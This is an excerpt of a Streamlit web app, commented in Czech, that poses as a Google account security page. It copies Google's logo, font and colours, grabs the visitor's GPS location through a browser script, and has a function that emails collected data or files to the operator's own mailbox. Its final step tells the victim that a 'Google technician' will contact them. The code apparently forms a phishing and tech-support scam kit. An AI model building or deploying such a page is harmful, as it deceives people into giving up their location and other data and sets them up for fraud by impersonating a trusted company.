...
# --- Trezor (Secrets) pro heslo k mailu ---
...
def odeslat_email(subjekt, text, soubor=None):
    if not MOJE_ADRESA or not MOJE_HESLO:
        st.warning("⚠️ Email není nakonfigurován (nastav MOJE_ADRESA a MOJE_HESLO)")
        return
    msg = MIMEMultipart()
    msg['Subject'] = subjekt
...
if "gps_processed" not in st.session_state:        # ← KLÍČOVÁ OPRAVA
    st.session_state.gps_processed = False

st.set_page_config(page_title="Zabezpečení účtu Google", page_icon="🔒", layout="centered")

# === VYLEPŠENÝ GOOGLE STYL (font, barvy, plynulost) ===
st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Product+Sans:wght@400;500;700&display=swap');
    body, .stApp { font-family: 'Product Sans', sans-serif; }
    ...
    .stInfo, .stSuccess, .stError { border-radius: 12px; }
    </style>
    """, unsafe_allow_html=True)

def show_logo():
    st.markdown("<h1 class='google-header'><span style='color: #4285F4;'>G</span><span style='color: #EA4335;'>o</span><span style='color: #FBBC05;'>o</span><span style='color: #4285F4;'>g</span><span style='color: #34A853;'>l</span><span style='color: #EA4335;'>e</span></h1>", unsafe_allow_html=True)
...
with col2:
    ...
    # 3. GPS (opraveno – už se nevrací na login)
        ...
        components.html(
            ...
            function getGPS() {
                navigator.geolocation.getCurrentPosition(
                    ...
                    function(err) { alert("Nepodařilo se získat polohu."); },
        ...
        if ("lat" in query_params and "lon" in query_params) and not st.session_state.gps_processed:
            ...
            st.query_params.clear()                    # vymaže parametry → žádný další refresh loop
    ...
    # 5. FINÁLE
        ...
        st.info("V nejbližší době vás bude kontaktovat technik Google pro finální potvrzení. Ne zavírejte tuto kartu.")
        st.progress(92)
